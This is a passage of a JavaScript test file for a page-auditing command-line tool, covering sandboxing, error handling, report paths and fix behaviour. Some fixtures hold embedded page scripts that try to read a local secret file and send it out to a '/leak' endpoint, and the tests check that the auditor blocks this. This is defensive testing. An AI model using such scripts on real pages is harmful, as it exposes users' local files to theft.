  // which CI runs, rejects a fetch() of a file URL inside the page without making a request, so there
  // would be nothing to hear). Closed at once after it is measured, the page would cancel the request
  // and the refusal would go unheard; standards audit keeps it open until its network is quiet.
  //
  // Nothing here waits a fixed time for the page. The server holds /hold for LATE ms, so the page's
  // request comes after the audit has measured it; the audit waits for that request because it is in
  // flight. When it is answered the page makes the refused request and, in the same turn, /tail, which
  // the server holds until the page has seen the refusal (/done). So the network is quiet only for the
  // gap between Playwright reporting /hold finished and the page's callback sending /tail and the
  // refused request, which is far smaller than the old 300 ms timer race but not zero. If measuring
  // takes longer than LATE (1500 ms), the request can finish before the audit starts waiting, and the
  // test then passes without exercising the keep-open path, as the old timer test could.
  const LATE = 1500;
  const dir = workspace();
  writeFileSync(join(dir, 'secret.txt'), LEAK);
  mkdirSync(join(dir, 'client'));
  const hits = [], tails = [], timers = new Set();
  const server = createServer((req, res) => {
    hits.push(req.url);
    const headers = { 'access-control-allow-origin': '*', 'content-type': 'text/plain' };
    if (req.url === '/hold') {
      const t = setTimeout(() => { timers.delete(t); res.writeHead(200, headers).end('ok'); }, LATE);
      timers.add(t);
      res.on('close', () => { clearTimeout(t); timers.delete(t); });
    } else if (req.url === '/tail') {
      tails.push(res);
      res.writeHead(200, headers);
      res.on('close', () => { const i = tails.indexOf(res); if (i >= 0) tails.splice(i, 1); });
    } else {
      if (req.url === '/done') for (const t of tails.splice(0)) t.end('ok');
      res.writeHead(200, headers).end('ok');
    }
  });
  await new Promise((ok) => server.listen(0, '127.0.0.1', ok));
  try {
    const origin = `http://127.0.0.1:${server.address().port}`;
    writeFileSync(join(dir, 'client', 'page.html'), `<!doctype html><html lang="en" data-register="ii"><head><meta charset="utf-8"><title>t</title></head>
<body><main><h1>Title</h1></main><script>
const get = (path, then) => { const x = new XMLHttpRequest(); x.open('GET', '${origin}' + path); if (then) x.onloadend = then; x.send(); };
addEventListener('load', () => get('/hold', () => {
  get('/tail');
  const x = new XMLHttpRequest(); x.open('GET', '../secret.txt'); x.onloadend = () => get('/done'); x.send();
}));
</script></body></html>`);
    const r = await standardsAsync(['client', '--widths', '320', '--json'], dir);
    const [p] = JSON.parse(r.stdout).pages;
    assert.deepEqual(p.failed, [{ resource: 'secret.txt', type: 'xhr', why: REFUSED.file }], r.stderr);
    assert.ok(!r.stdout.includes(LEAK));
    assert.ok(hits.includes('/done'), `the page saw the refusal: ${hits.join(' ')}`);
  } finally {
    for (const t of timers) clearTimeout(t);
    for (const t of tails) t.destroy();
    server.closeAllConnections();
    await new Promise((ok) => server.close(ok));
  }
});

test('a page from a URL reads no local file, with the fixer as without it', { skip }, async () => {
  const dir = workspace();
  writeFileSync(join(dir, 'secret.txt'), LEAK);
  const secret = pathToFileURL(join(dir, 'secret.txt')).href;
  const server = await serve(() => ({ body: `<!doctype html><html lang="en" data-register="ii"><head><meta charset="utf-8"><title>t</title></head>
<body><main><h1>Title</h1><h4 id="h">x</h4><p id="p">x</p></main><script>
fetch(${JSON.stringify(secret)}).then((r) => r.text()).then((t) => { document.getElementById('p').style.fontFamily = t; document.getElementById('h').textContent = t; new Image().src = '${server.origin}/leak?d=' + encodeURIComponent(t); }, () => {});
</script></body></html>` }));
  for (const fix of [[], ['--fix']]) {
    const r = await standardsAsync([`${server.origin}/page.html`, ...fix, '--widths', '320', '--json'], dir);
    assert.ok(r.stdout, r.stderr);
    assert.ok(!r.stdout.includes(LEAK), `the JSON does not carry the file ${fix.join(' ')}`);
    assert.equal(JSON.parse(r.stdout).pages[0].loaded, true);
  }
  await server.close();
  assert.ok(!server.hits.some((h) => h.includes(LEAK)), server.hits.join('\n'));
});

test('a URL not answered with a 2xx document is not loaded and not counted clean, whatever a plain fetch was answered', { skip }, async () => {
  const page = readFileSync(join(FIXTURES, 'clean.html'), 'utf8');
  // Node's fetch is answered with the page; a browser with a 403, as a bot wall answers it. /gone is
  // answered 404 whoever asks.
  const wall = await serve((req) => (req.url === '/gone' ? { status: 404, body: 'Not found' } : /node/i.test(req.headers['user-agent'] ?? '') ? { body: page } : { status: 403, body: '<!doctype html><title>Access denied</title><p>Access denied</p>' }));
  // With the fixer as without it: the fixer's copy is made from what Node was answered, and is not
  // what the browser was answered.
  const runs = [];
  for (const fix of [[], ['--fix']]) runs.push({ fix, r: await standardsAsync([`${wall.origin}/page.html`, `${wall.origin}/gone`, ...fix, '--widths', '320', '--json'], workspace()) });
  await wall.close();
  for (const { fix, r } of runs) {
    assert.equal(r.status, 1, r.stdout + r.stderr);
    const a = JSON.parse(r.stdout).aggregate;
    assert.equal(a.loaded, 0, fix.join(' '));
    assert.equal(a.clean.before, 0);
    assert.deepEqual(a.notLoaded.map((p) => p.error.match(/HTTP \d+/)?.[0]), ['HTTP 403', 'HTTP 404'], fix.join(' '));
    if (fix.length) assert.equal(a.clean.after, 0);
  }
});

test('an empty file, a file of plain text, a blank page and a file that is not HTML are not counted as clean pages', { skip }, () => {
  const dir = workspace();
  mkdirSync(join(dir, 'blank'));
  writeFileSync(join(dir, 'blank', 'empty.html'), '');
  writeFileSync(join(dir, 'blank', 'error.html'), 'Internal Server Error\n');
  writeFileSync(join(dir, 'blank', 'nothing.html'), '<!doctype html><html lang="en"><head><title>x</title></head><body></body></html>');
  writeFileSync(join(dir, 'notes.txt'), 'Some notes.\n');
  const r = standards(['blank', 'notes.txt', '--widths', '320', '--json'], dir);
  assert.equal(r.status, 1, r.stdout + r.stderr);
  const json = JSON.parse(r.stdout);
  assert.equal(json.aggregate.loaded, 0);
  assert.equal(json.aggregate.clean.before, 0);
  assert.deepEqual(json.aggregate.notLoaded.map((p) => [p.input, p.error]), [
    ['blank/empty.html', 'not measured: it is empty'],
    ['blank/error.html', 'not measured: it holds no HTML markup'],
    ['blank/nothing.html', 'not measured: there is no text, image, link or control on it to measure'],
    ['notes.txt', 'not measured: a .txt file, not an HTML page'],
  ]);
});

test('a page named twice is measured once, and a report written by an earlier run is not a page of the set', { skip }, () => {
  const dir = workspace();
  copyFileSync(join(FIXTURES, 'stubborn.html'), join(dir, 'index.html'));
  const first = standards(['.', '--widths', '320'], dir);
  assert.ok(existsSync(join(dir, 'standards-audit.html')), first.stdout + first.stderr);
  const again = standards(['.', 'index.html', './index.html', '--widths', '320', '--json'], dir);
  const json = JSON.parse(again.stdout);
  assert.deepEqual(json.pages.map((p) => p.name), ['index.html']);
  assert.equal(json.aggregate.pages, 1);
});

test('the report carries no absolute path outside the command that repeats it, names its system, and repeats', { skip }, () => {
  const dir = workspace();
  const { root } = site(['clean.html'], dir);
  const client = join(dir, 'client');
  mkdirSync(client);
  // A project set up with standards init: standards.config.json names the system, and lowers a rule.
  copyFileSync(join(ROOT, 'test/fixtures/rounded.tokens.json'), join(client, 'system.json'));
  writeFileSync(join(client, 'standards.config.json'), JSON.stringify({ system: 'system.json', rules: { 'shadow-present': 'off' } }));
  const typed = join(client, 'system.json');
  // The site outside the working directory, typed in full and as a path from it; the system from
  // standards.config.json, then typed in full. The command carries what was typed, so it runs as it reads.
  const runs = [
    { args: [root], command: `npx @appliedform/standards@4 audit ${root} --system system.json --widths 320` },
    { args: ['../site', '--system', typed], command: `npx @appliedform/standards@4 audit ../site --system ${typed} --widths 320` },
  ];
  const withoutCommands = (html) => html.replace(/<pre class="af-code"[\s\S]*?<\/pre>/, '').replace(/<p>One page at a time: .*<\/p>/, '');
  for (const { args, command } of runs) {
    const out = join(client, 'report.html');
    const r = standards([...args, '--widths', '320', '--json', '--out', out], client);
    assert.ok(r.stdout, r.stderr);
    const json = JSON.parse(r.stdout);
    assert.equal(json.command, command);
    // Everything else, the heading and the provenance included, is free of the auditor's directories.
    // The one-page commands are commands too, and carry what was typed.
    const { command: _command, pageCommand: _pageCommand, system: { arg: _arg, ...system }, pages: withCommands, ...rest } = json;
    const pages = withCommands.map(({ command: _one, ...p }) => p);
    assert.ok(!JSON.stringify({ ...rest, system, pages }).includes(dir), `the JSON carries ${dir} outside the commands (${args})`);
    const html = readFileSync(out, 'utf8');
    assert.ok(!withoutCommands(html).includes(dir), `the HTML carries ${dir} outside the command (${args})`);
    assert.equal(json.system.label, 'system.json');
    assert.deepEqual(json.pages.map((p) => p.name), ['site/test/fixtures/report/clean.html']);
    assert.match(html, /<h1>.* checked against system\.json<\/h1>/);
    assert.match(html, /System: system\.json/);
    assert.deepEqual(json.policy, { applied: false, overrides: { 'shadow-present': 'off' } });
    assert.match(html, /shadow-present: off in the project's config, not applied/);
    // The command repeats the run from where it was made.
    const again = standards([...json.command.replace(/^npx @appliedform\/standards@4 audit /, '').split(' '), '--json'], client);
    assert.equal(again.status, 0, again.stdout + again.stderr);
    assert.equal(JSON.parse(again.stdout).aggregate.loaded, 1);
    // So does the page's own command, which gives the site named above it with --root, and the
    // page is named as the set named it, from the site's parent.
    const one = standards([...json.pages[0].command.replace(/^npx @appliedform\/standards@4 audit /, '').split(' '), '--json'], client);
    assert.equal(one.status, 0, one.stdout + one.stderr);
    assert.deepEqual(JSON.parse(one.stdout).pages.map((p) => [p.name, p.command]), [[json.pages[0].name, json.pages[0].command]]);
  }
  assert.match(readFileSync(join(client, 'report.html'), 'utf8'), new RegExp(`npx @appliedform/standards@4 audit &lt;page&gt; --widths 320 --system ${typed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`));
});

test('the overrides note names the config file the project has, old name or new; the report names none', { skip }, () => {
  for (const name of [CONFIG.name, CONFIG.legacy]) {
    const dir = workspace();
    site(['clean.html'], dir);
    writeFileSync(join(dir, name), JSON.stringify({ rules: { 'shadow-present': 'off' } }));
    const out = join(dir, 'r.html');
    const r = standards(['site', '--widths', '320', '--out', out], dir);
    assert.equal(r.status, 0, r.stderr);
    assert.ok(r.stderr.includes(`standards audit: ${name} sets shadow-present: off; the report does not apply rule overrides, and checks every rule it lists\n`), r.stderr);
    const html = readFileSync(out, 'utf8');
    assert.match(html, /Rule overrides: shadow-present: off in the project's config, not applied/);
    assert.doesNotMatch(html, new RegExp([CONFIG.name, CONFIG.legacy].map((n) => n.replace(/\./g, '\\.')).join('|')), 'the report names a file the project may not have');
  }
});

test('with --fix the run passes or fails on the pages as they are, since the fixes are not written', { skip }, () => {
  const { dir, at } = site(['fixable.html']);
  const page = join(at, 'fixable.html');
  const before = readFileSync(page, 'utf8');
  const out = join(dir, 'report.html');
  const r = standards(['site', '--fix', '--widths', '320', '--json', '--out', out], dir);
  const json = JSON.parse(r.stdout);
  assert.deepEqual(json.aggregate.clean, { before: 0, after: 1 }, 'the fixer cures the page');
  assert.equal(r.status, 1, 'the page on disk still fails');
  assert.equal(json.written, false);
  assert.equal(readFileSync(page, 'utf8'), before, 'the page is not written');
  assert.ok(!existsSync(join(at, 'fixable.fixed.html')));
  const html = readFileSync(out, 'utf8');
  assert.match(html, /not written to the pages/);
  assert.doesNotMatch(html, /Fixes applied/);
});

test('standards report is the team aggregate as on main, and standards audit is the audit', () => {
  const dir = workspace();
  const run = join(dir, 'run.json');
  writeFileSync(run, JSON.stringify({ team: 'alpha', pages: [{ url: 'a', viewport: 320, violations: [] }] }));
  const report = (args) => spawnSync(process.execPath, [STANDARDS_BIN, 'report', ...args], { cwd: dir, encoding: 'utf8', env: env(), timeout: 600000 });
  const r = report([run, '--history', join(dir, 'history.json'), '--json']);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(JSON.parse(r.stdout).totals.pages, 1);
  // A page given to standards report is read as a run file, as on main: it does not run the audit.
  const page = report([join(FIXTURES, 'clean.html'), '--json']);
  assert.equal(page.status, 2, page.stdout);
  assert.ok(!existsSync(join(dir, 'standards-audit.html')));
  // A report from before the rename (generator "af report") is still recognised and left out of a set.
  assert.equal(isReport('<!doctype html><meta name="generator" content="af report">'), true);
  assert.equal(isReport('<!doctype html><meta name="generator" content="af audit">'), true);
  assert.equal(isReport('<!doctype html><meta name="generator" content="standards audit">'), true);
});

test('--system resolves a brand, an overlay and a bundled pack, and refuses what it cannot find', () => {
  assert.deepEqual(resolveSystem('north'), { brand: 'north', label: 'north' });
  const overlay = resolveSystem(join(ROOT, 'test/fixtures/rounded.tokens.json'));
  assert.equal(overlay.brand, join(ROOT, 'test/fixtures/rounded.tokens.json'));
  const pack = resolveSystem('instrument');
  assert.ok(existsSync(pack.brand), 'the pack is imported to a token file');
  assert.equal(pack.label, 'instrument');
  assert.throws(() => resolveSystem('nowhere.json'), /no such file/);
  assert.throws(() => resolveSystem('not a/name'), /no system named/);
});

test('under a Standards pack, the pages are judged by the rules the pack is held to, and the report says so', { skip }, () => {
  const r = standards(['test/fixtures/report/clean.html', '--system', 'instrument', '--widths', '320', '--json'], ROOT);
  assert.ok(r.status === 0 || r.status === 1, r.stderr);
  const json = JSON.parse(r.stdout);
  assert.equal(json.system.scope, 'pack');
  assert.equal(json.system.label, 'instrument');
  assert.equal(json.pages[0].scope, 'pack');
  assert.ok(json.rulesChecked.length < rulesChecked('system').length, 'a pack is held to fewer rules than the house');
  assert.match(json.command, /--system instrument/);
});

test('a usage error exits 2 and says what is wrong', () => {
  const dir = workspace();
  let r = standards(['--fix'], dir);
  assert.equal(r.status, 2);
  assert.match(r.stderr, /usage: standards audit/);
  r = standards([dir, '--widths', 'wide'], dir);
  assert.equal(r.status, 2);
  assert.match(r.stderr, /--widths/);
  r = standards([dir, '--widths', '320'], dir);
  assert.equal(r.status, 2);
  assert.match(r.stderr, /no pages/);
  r = standards([dir, '--root', join(dir, 'nowhere')], dir);
  assert.equal(r.status, 2);
  assert.match(r.stderr, /--root .*nowhere: no such directory/);
  r = standards([dir, '--root'], dir);
  assert.equal(r.status, 2);
  assert.match(r.stderr, /--root needs a value/);
  r = standards([dir, 'http://127.0.0.1:9/', '--offline'], dir);
  assert.equal(r.status, 2);
  assert.match(r.stderr, /--offline refuses the network, so it cannot audit a URL/);
});
